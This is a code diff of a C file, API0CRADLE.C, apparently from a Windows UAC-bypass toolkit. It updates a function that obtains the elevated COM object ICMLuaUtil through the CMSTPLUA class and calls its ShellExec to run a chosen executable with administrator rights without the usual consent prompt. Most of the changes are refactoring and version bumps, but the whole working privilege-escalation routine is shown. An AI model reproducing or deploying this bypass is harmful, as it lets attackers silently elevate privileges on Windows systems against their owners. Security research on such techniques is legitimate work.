@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     3.10
+*  VERSION:     3.17
 *
-*  DATE:        18 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -27,12 +27,13 @@
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
 */
-BOOL ucmCMLuaUtilShellExecMethod(
+NTSTATUS ucmCMLuaUtilShellExecMethod(
     _In_ LPWSTR lpszExecutable
 )
 {
+    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
     HRESULT          r = E_FAIL, hr_init;
-    BOOL             bCond = FALSE, bApprove = FALSE;
+    BOOL             bApprove = FALSE;
     ICMLuaUtil      *CMLuaUtil = NULL;
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -44,8 +45,10 @@ BOOL ucmCMLuaUtilShellExecMethod(
         //
         if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
             if (bApprove == FALSE)
-                if (ucmShowQuestion(UACFIX) != IDYES)
+                if (ucmShowQuestion(UACFIX) != IDYES) {
+                    MethodResult = STATUS_CANCELLED;
                     break;
+                }
         }
 
         r = ucmAllocateElevatedObject(
@@ -62,14 +65,17 @@ BOOL ucmCMLuaUtilShellExecMethod(
             break;
         }
 
-        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, 
-            lpszExecutable, 
-            NULL, 
-            NULL, 
-            SEE_MASK_DEFAULT, 
+        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
+            lpszExecutable,
+            NULL,
+            NULL,
+            SEE_MASK_DEFAULT,
             SW_SHOW);
 
-    } while (bCond);
+        if (SUCCEEDED(r))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
 
     if (CMLuaUtil != NULL) {
         CMLuaUtil->lpVtbl->Release(CMLuaUtil);
@@ -78,5 +84,5 @@ BOOL ucmCMLuaUtilShellExecMethod(
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return SUCCEEDED(r);
+    return MethodResult;
 }
